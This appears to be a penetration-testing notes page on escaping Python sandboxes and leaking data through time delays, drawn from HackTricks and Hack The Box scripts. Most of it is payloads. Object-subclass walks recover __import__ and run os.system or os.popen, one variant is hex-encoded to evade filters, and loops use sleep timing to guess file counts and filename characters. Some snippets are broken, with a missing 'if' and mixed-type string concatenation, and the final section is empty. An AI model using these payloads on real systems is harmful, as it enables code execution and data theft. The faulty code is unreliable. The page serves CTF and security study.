# Time Based Guessing

## Python Time commands

* Ref : [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes\#executing-python-code](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#executing-python-code)

```text
# time.sleep
{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__["__import__"]("time").sleep(100)

# You can also multiline the above command
i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
i('time').sleep(3)

# hex encode of some special chars of the above command (multiline)
i={}\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\x5f\x28)\x5b59]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f\x5b'\x5f\x5fimport\x5f\x5f']\ni\x28'time')\x2esleep\x283)

# Command for system.sleep(100)
{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('sleep 3')

```

## Restore builtins and execute time based python command \(no limit on characters\)

* [https://github.com/nEcr0tik/htb/tree/master/mine-scripts/Python\_Sandbox/Python2](https://github.com/nEcr0tik/htb/tree/master/mine-scripts/Python_Sandbox/Python2)

```text

# Restore builtin
__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
__builtins__["__import__"]('os').system('ls')



### To execute + read output

# Print all available function in __builtins__
print(__builtins__)

# len()
size = __builtins__['len']('String len is 16')

# import os; os.popen('ls').read()
lsfiles = __builtins__['__import__']('os').popen('ls').read()

# python2 print current working directory os.getcwd()
cdir = lfiles = __builtins__['__import__']('os').getcwd()

# GUESS : Number of files in current directory < 30
for n in range(0,30):                                                  # This will be on attacker side
    print(" If program paused now, then number of files is : "+str(n)) # This will be on attacker side
    if __builtins__['__import__']('os').listdir(cdir).__len__()==n:
        __builtins__['__import__']('time').sleep(20)

# GUESS : Length of each file name, say ndir=4
ndir=4
for file_index in range(0,ndir):
    for n in range(0,30):
        print("If program paused now, then " + file_index + "file name len() is : " + n)
        __builtins__['__import__']('os').listdir(cdir)[file_index]==n:
            __builtins__['__import__']('time').sleep(20)


# GUESS : File names len<20 given path and number of files
import string                                                # This will be on attacker side
char_set = string.ascii_letters + '0123456789' + '/-\n'      # This will be on attacker side
flag = 0
for file_index in range(0,ndir):                             # This will be on attacker side
    flag = 0
    for char_index in range(0,20):                           # This will be on attacker side
        for ele in char_set:                                 # This will be on attacker side
            if __builtins__['__import__']('os').listdir(cdir)[file_index][char_index]==ele:
                # __builtins__['__import__']('time').sleep(20)                                 # Real command
                print(str(file_index) + "file name is : " + ele + "\n")                             # For simplicity of this.
                if(ele == '\n'):
                    flag=1
                    break
        if (flag ==1):
            break


```

![Number of files in current working directory](../../../.gitbook/assets/image%20%28154%29.png)

```text
# Get present working directory
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').getcwd()

# Execute ls
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
```

## Restore builtins and execute time based python command \(characters limited to 300\)

```text

```

